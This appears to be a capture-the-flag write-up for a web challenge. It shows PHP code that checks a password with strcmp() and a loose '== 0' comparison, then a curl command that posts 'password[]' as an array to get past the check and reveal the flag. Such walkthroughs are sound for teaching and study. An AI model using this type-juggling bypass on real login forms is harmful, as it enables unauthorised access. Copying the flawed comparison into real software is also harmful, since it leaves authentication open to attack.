Clown Juggling II
=================

## Challenge info:

The programmer fixed the app so the password doesn't appear in the URL bar anymore, but something tells me the core vulnerbility hasn't been fixed...
Connect to the app by browsing to: http://challenges.matrix8.net/clownjuggling2/

## Solution:

Visiting the linked site revealed a page largely similar to the one from Clown Juggling I, with the exception of a posted update that "Fixed a security issue by removing the submitted password from the URL bar". As expected, the PHP source is also mostly identical:
```php
		<?php
			if( isset($_POST['password']) ) {
				if( strcmp($_POST['password'], $password) == 0 ) {
					echo "<div class=\"alert alert-success\" role=\"alert\">The flag is " . $flag . "</div>";
				} else {
					echo "<div class=\"alert alert-danger\" role=\"alert\">Invalid Password</div>";
				}
			}
		?>
```
So the developer switched from using GET requests to POST requests, but it seems as though the same attack from Clown Juggling I would work here; thankfully, `curl` handles them as well:
```
$ curl -s -d 'password[]=%22%22' http://challenges.matrix8.net/clownjuggling2/ | grep flag
<div class="alert alert-success" role="alert">The flag is Equifax{http_post_method_wont_fix_type_juggling_attacks}</div>
```
